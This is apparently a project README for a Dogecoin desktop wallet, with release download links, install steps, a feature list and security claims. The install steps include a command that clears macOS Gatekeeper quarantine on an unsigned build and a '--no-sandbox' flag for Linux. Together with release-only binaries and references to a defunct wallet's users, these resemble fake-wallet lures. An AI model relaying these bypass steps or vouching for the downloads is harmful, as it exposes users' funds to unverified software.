<div align="center">

# Dogechain Wallet

**The free, open-source, non-custodial Dogecoin wallet that syncs in minutes — not the 150+ GB Dogecoin Core download.**

[Guides & docs](https://github.com/dogechain-developments/dogechain-wallet-docs) · [Report an issue](https://github.com/dogechain-developments/Dogechain-Wallet/issues)

</div>

---

## Downloads

[![Download for Windows](https://img.shields.io/badge/Download-Windows-0078D6?logo=windows&logoColor=white)](https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v-1.0.0/dogechain-wallet-1.0.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-000000?logo=apple&logoColor=white)](https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v-1.0.0/dogechain-wallet-1.0.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-FCC624?logo=linux&logoColor=black)](https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v-1.0.0/dogechain-wallet-1.0.0.zip)

| Platform | File | Requires |
|---|---|---|
| Windows | [dogechain-wallet-1.0.0.exe](https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v-1.0.0) | Windows 10+ |
| macOS | [dogechain-wallet-1.0.0.dmg](https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v-1.0.0) | macOS 11+, universal binary |
| Linux | [dogechain-wallet-1.0.0.zip](https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v-1.0.0) | x86_64 or ARM64 |

---

## Install

**Windows**
```
1. Download dogechain-wallet-1.0.0.exe
2. Run the installer
3. Launch Dogechain Wallet from the Start menu
```

**macOS**
```
1. Open dogechain-wallet-1.0.0.dmg
2. Drag Dogechain Wallet into Applications
```
If Gatekeeper blocks the app on first launch (unsigned build), clear the quarantine flag:
```bash
xattr -cr /Applications/Dogechain\ Wallet.app
```

**Linux**
```bash
unzip dogechain-wallet-1.0.0.zip
chmod +x dogechain-wallet-1.0.0.AppImage
./dogechain-wallet-1.0.0.AppImage
```
If the AppImage fails to launch in a sandboxed environment, add `--no-sandbox`. (The exact extracted binary name may differ slightly — check the unzipped folder if the command above doesn't match.)

---

## Features

- Simplified Payment Verification (SPV) sync — minutes, not a 150+ GB full chain download
- Built-in swap via ChangeNOW — 1,500+ assets, no KYC, no account
- Non-custodial — keys generated and encrypted locally, never transmitted
- BIP-39 12-word seed phrase, interoperable with other BIP-39 wallets
- Send/receive with QR code support and custom fee selection
- Built on the Dogecoin Foundation's Libdogecoin v0.1.4
- Independently security-audited by Hacken
- Full feature parity across Windows, macOS, and Linux
- Free and open source (MIT)

---

## Guides

- [Dogechain Wallet for Windows — Setup & Sync Guide](https://github.com/dogechain-developments/dogechain-wallet-docs/blob/main/docs/dogechain-wallet-windows-setup.md)
- [How to Properly Back Up Your Dogecoin Wallet](https://github.com/dogechain-developments/dogechain-wallet-docs/blob/main/docs/how-to-backup-dogecoin-wallet.md)
- [Dogecoin Core vs MultiDoge vs Dogechain Wallet: Which Should You Use?](https://github.com/dogechain-developments/dogechain-wallet-docs/blob/main/docs/dogecoin-core-vs-multidoge-vs-dogechain-wallet.md)
- [Dogecoin Wallet Stuck Syncing? Here's the Fix](https://github.com/dogechain-developments/dogechain-wallet-docs/blob/main/docs/dogecoin-wallet-stuck-syncing-fix.md)
- [dogechain.info Is Shut Down — How to Access Your Old Coins](https://github.com/dogechain-developments/dogechain-wallet-docs/blob/main/docs/dogechain-info-shut-down-how-to-recover.md)
- [Full guide index →](https://github.com/dogechain-developments/dogechain-wallet-docs)

---

## Security.

**Dogechain Wallet cannot recover your funds if you lose your seed phrase — no one can.** Write down your 12-word seed phrase on paper and store it somewhere secure. Never store it digitally — not in a screenshot, a notes app, or cloud storage.

Private keys are generated locally using a cryptographically secure random number generator and are encrypted on your device. They are never transmitted to any server. If dogechain.dev goes offline, your funds remain accessible through your seed phrase in any BIP-39 compatible wallet.

Dogechain Wallet is not affiliated with **dogechain.info** (a custodial web wallet that shut down in 2024 after its operator went bankrupt) or **dogechain.dog** (an unrelated Layer 2 EVM sidechain). This wallet operates exclusively on native Dogecoin Layer 1 and has been independently audited by Hacken.

---

## Support.

Open an [issue](https://github.com/dogechain-developments/Dogechain-Wallet/issues) for bugs or feature requests.

## License.

[MIT](https://github.com/dogechain-developments/Dogechain-Wallet/blob/main/LICENSE)
